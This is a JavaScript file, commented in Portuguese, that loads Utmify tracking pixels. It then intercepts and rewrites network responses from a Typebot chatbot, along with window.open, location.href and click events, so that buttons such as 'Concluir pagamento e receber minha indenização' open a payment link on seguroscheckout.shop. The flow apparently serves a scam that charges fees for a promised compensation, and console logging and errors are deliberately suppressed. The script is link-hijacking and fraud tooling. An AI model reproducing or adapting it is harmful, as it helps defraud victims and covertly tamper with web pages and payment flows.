// Adiciona scripts da Utmify
(function() {
    // Script 1: UTMs
    const utmScript = document.createElement('script');
    utmScript.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    utmScript.setAttribute('data-utmify-prevent-xcod-sck', '');
    utmScript.setAttribute('data-utmify-prevent-subids', '');
    utmScript.async = true;
    utmScript.defer = true;
    document.head.appendChild(utmScript);

    // Script 2: Pixel
    window.pixelId = "68ef23cb4d4bf46efd3d88d4";
    const pixelScript = document.createElement("script");
    pixelScript.setAttribute("async", "");
    pixelScript.setAttribute("defer", "");
    pixelScript.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
    document.head.appendChild(pixelScript);
})();

// Script ULTRA AGRESSIVO para interceptar e substituir links no Typebot
(function() {
    const oldLink = 'https://pay.seguroscheckout.shop/VroegN1RNryGKwj';
    const newLink = 'https://pay.seguroscheckout.shop/VroegN1RNryGKwj';
    const oldDomain = 'seguroscheckout.shop';
    const newDomain = 'seguroscheckout.shop';
    const buttonKeywords = ['Concluir', 'pagamento', 'receber', 'indenização', 'indenizacao'];
    
    // logs removidos
    
    // Função para substituir links em qualquer string/objeto
    function replaceLinks(obj) {
        if (typeof obj === 'string') {
            if (obj.includes(oldLink) || obj.includes(oldDomain) || obj.includes('5pjw3Rn54Ya32lQ')) {
                // log removido
                return obj.replace(new RegExp(oldLink.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newLink)
                          .replace(new RegExp(oldDomain.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newDomain)
                          .replace(/5pjw3Rn54Ya32lQ/g, 'VroegN1RNryGKwj');
            }
            return obj;
        }
        if (typeof obj === 'object' && obj !== null) {
            if (Array.isArray(obj)) {
                return obj.map(item => replaceLinks(item));
            }
            const newObj = {};
            for (let key in obj) {
                newObj[key] = replaceLinks(obj[key]);
            }
            return newObj;
        }
        return obj;
    }
    
    // Intercepta XMLHttpRequest COMPLETAMENTE
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    Object.defineProperty(XMLHttpRequest.prototype, 'responseText', {
        get: function() {
            const text = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseText').get.call(this);
            if (this.responseURL && this.responseURL.includes('railway.app')) {
                try {
                    const modified = replaceLinks(text);
                    if (modified !== text) {
                        // log removido
                    }
                    return modified;
                } catch(e) {}
            }
            return text;
        }
    });
    
    XMLHttpRequest.prototype.send = function(data) {
        this.addEventListener('load', function() {
            if (this.responseURL && this.responseURL.includes('railway.app')) {
                try {
                    const text = this.responseText;
                    if (text && (text.includes(oldLink) || text.includes(oldDomain))) {
                        // log removido
                    }
                } catch(e) {}
            }
        });
        return originalXHRSend.apply(this, arguments);
    };
    
    // Intercepta Fetch COMPLETAMENTE
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const response = await originalFetch.apply(this, args);
        const url = typeof args[0] === 'string' ? args[0] : args[0]?.url;
        
        if (url && url.includes('railway.app')) {
            const clonedResponse = response.clone();
            try {
                const contentType = response.headers.get('content-type');
                let data;
                
                if (contentType && contentType.includes('application/json')) {
                    data = await clonedResponse.json();
                    const modified = replaceLinks(data);
                    
                    if (JSON.stringify(modified) !== JSON.stringify(data)) {
                        // log removido
                        return new Response(JSON.stringify(modified), {
                            status: response.status,
                            statusText: response.statusText,
                            headers: response.headers
                        });
                    }
                } else {
                    data = await clonedResponse.text();
                    const modified = replaceLinks(data);
                    
                    if (modified !== data) {
                        // log removido
                        return new Response(modified, {
                            status: response.status,
                            statusText: response.statusText,
                            headers: response.headers
                        });
                    }
                }
            } catch(e) {
                // erro suprimido para não logar no console
            }
        }
        
        return response;
    };
    
    // Intercepta window.open
    const originalWindowOpen = window.open;
    window.open = function(url, ...args) {
        if (url && (url.includes(oldLink) || url.includes(oldDomain) || url.includes('5pjw3Rn54Ya32lQ'))) {
            // log removido
            return originalWindowOpen.call(this, newLink, ...args);
        }
        return originalWindowOpen.call(this, url, ...args);
    };
    
    // Intercepta location.href
    let currentHref = window.location.href;
    Object.defineProperty(window.location, 'href', {
        get: function() { return currentHref; },
        set: function(url) {
            if (url && (url.includes(oldLink) || url.includes(oldDomain) || url.includes('5pjw3Rn54Ya32lQ'))) {
                // log removido
                currentHref = newLink;
                window.open(newLink, '_blank');
            } else {
                currentHref = url;
                window.location.replace(url);
            }
        }
    });
    
    // Aguarda o DOM estar pronto
    function init() {
        // Intercepta cliques em TODOS os elementos COM PRIORIDADE MÁXIMA
        document.addEventListener('click', function(e) {
            let target = e.target;
            
            // Procura pelo elemento clicável e verifica o texto
            for (let i = 0; i < 10; i++) {
                if (!target) break;
                
                const text = target.textContent || target.innerText || '';
                const href = target.getAttribute('href') || target.getAttribute('data-href');
                // log removido
                
                // Se o texto contém "Concluir pagamento" ou o link antigo
                if (text.includes('Concluir pagamento') || 
                    text.includes('receber minha indenização') ||
                    text.includes('pagamento e receber') ||
                    (href && (href.includes('confirmacao-dopagamento.com') || href.includes('5pjw3Rn54Ya32lQ') || href.includes('pay.')))) {
                    // log removido
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    
                    // Abre o novo link
                    setTimeout(() => {
                        window.open(newLink, '_blank');
                    }, 100);
                    return false;
                }
                
                target = target.parentElement;
            }
        }, true);
        
        // Observer para modificar links que aparecem dinamicamente
        if (document.body) {
            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === 1) {
                            // Procura por elementos com o texto do botão
                            const allElements = node.querySelectorAll ? node.querySelectorAll('*') : [];
                            allElements.forEach(function(el) {
                                const text = el.textContent || el.innerText || '';
                                const href = el.getAttribute('href') || el.getAttribute('data-href');
                                
                                // Modifica links antigos
                                if (href && (href.includes('confirmacao-dopagamento.com') || href.includes('VroegN1RNryGKwj'))) {
                                    // log removido
                                    if (el.getAttribute('href')) {
                                        el.setAttribute('href', newLink);
                                    }
                                    if (el.getAttribute('data-href')) {
                                        el.setAttribute('data-href', newLink);
                                    }
                                }
                                
                                // Adiciona evento de clique em botões de pagamento
                                if (text.includes('Concluir pagamento') || text.includes('receber minha indenização')) {
                                    el.addEventListener('click', function(e) {
                                        // log removido
                                        e.preventDefault();
                                        e.stopPropagation();
                                        window.open(newLink, '_blank');
                                        return false;
                                    }, true);
                                }
                            });
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                characterData: true
            });
        }
        
        // logs removidos
    }
    
    // Inicia quando o DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
